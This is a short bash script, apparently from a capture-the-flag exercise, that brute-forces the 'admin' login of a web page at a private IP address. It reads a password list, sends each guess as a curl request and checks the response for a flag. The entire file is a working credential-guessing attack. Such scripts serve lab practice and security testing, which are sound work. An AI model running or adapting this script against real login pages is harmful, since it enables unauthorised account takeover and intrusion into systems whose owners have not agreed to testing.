#!/bin/bash

if [ "$*" == "" ]; then
    echo "Usage: sh script.sh [password_list_path]"
    exit 1
fi

if [ ! -f $1 ]; then
    echo "File not found!"
	echo "Usage: sh script.sh [password_list_path]"
	exit
fi

URL="http://10.12.100.158/?page=signin"

echo "Bruteforcing login credentials on $URL\n"

while read -r PASS;
do
	curl -s "http://10.12.100.158/?page=signin&username=admin&password=$PASS&Login=Login#" | grep "flag" > .temp
	echo "Trying admin:$PASS";
	if grep -q "flag" .temp; then
    	echo "Login Succefull"
		FLAG=`cat .temp | awk '{print $6}'`
		echo "Here's your flag : $FLAG"
		rm -rf .temp
		exit
	fi
done < $1